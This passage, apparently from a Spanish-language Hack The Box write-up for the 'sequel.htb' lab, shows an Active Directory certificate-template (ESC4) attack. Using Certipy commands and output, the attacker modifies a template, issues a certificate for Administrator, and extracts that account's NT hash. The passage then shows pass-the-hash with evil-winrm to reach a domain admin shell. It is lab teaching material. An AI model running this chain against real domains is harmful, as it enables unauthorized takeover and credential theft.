[*] Got CA configuration for 'sequel-DC01-CA'
[*] Saved BloodHound data to '20250512133606_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250512133606_Certipy.txt'
[*] Saved JSON output to '20250512133606_Certipy.json'
~~~

Hemos recolectado información de plantillas de certificados, veamos qué podemos hacer

~~~ bash
cat 20250512133606_Certipy.txt

Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
~~~

La plantilla `DunderMifflinAuthentication` tiene permisos excesivos otorgados al grupo `SEQUEL\Cert Publishers`, esto la hace vulnerable a la emisión de certificados mediante usuarios no autorizados. En este caso, autenticaremos al usuario `Administrator` para obtener un hash `NT`

### Modifying Template

Primero, modificamos la plantilla para que pueda ser procesada correctamente a la hora de emitir un certificado con la cuenta `ca_svc`

~~~ bash
certipy template -template DunderMifflinAuthentication -u ca_svc -k -dc-ip 10.10.11.51 -target dc01.sequel.htb                            
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
~~~

### Issuing a Privileged Certificate

Emitiremos un certificado para el usuario `Administrator` enviando la plantilla, el nombre del certificado y algunos datos como el `User Principal Name`, `Name Server` y un DNS alternativo (nuestra máquina). **Importante: Si nos muestra un error, debemos volver a ejecutar el comando anterior y rápidamente ejecutar el siguiente comando**

~~~ bash
certipy req -u ca_svc@sequel.htb -hashes ':3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'SEQUEL.HTB' at '10.10.11.51'
[+] Resolved 'SEQUEL.HTB' from cache: 10.10.11.51
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 33
[*] Got certificate with multiple identifications
    UPN: 'Administrator@sequel.htb'
    DNS Host Name: '10.10.15.37'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_10.pfx'
~~~


## PassTheCertificate

Procedemos a autenticarnos usando el certificado que generamos y que se guardó en el archivo `administrator_10.pfx` para obtener el hash `NT` del usuario `Administrator`

~~~ bash
certipy auth -pfx administrator_10.pfx -domain sequel.htb -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'Administrator@sequel.htb'
    [1] DNS Host Name: '10.10.15.37'
> 0
[+] Trying to resolve 'sequel.htb' at '192.168.29.2'
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
~~~


## Shell as `Administrator` - PassTheHash

Solamente queda conectarnos a la máquina víctima, esto lo podemos hacer con varias herramientas dado que ya contamos con el hash `NT` del administrador del dominio. En mi caso usaré `evil-winrm`

~~~ bash
evil-winrm -i 10.10.11.51 -u 'Administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
~~~

Ya podremos ver la flag del sistema almacenada dentro de la carpeta `C:\Users\Administrator\Desktop`

~~~ bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt 
5ac...
~~~

Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> I want to do with you what spring does with cherry trees.
> — Pablo Neruda
{: .notice--info}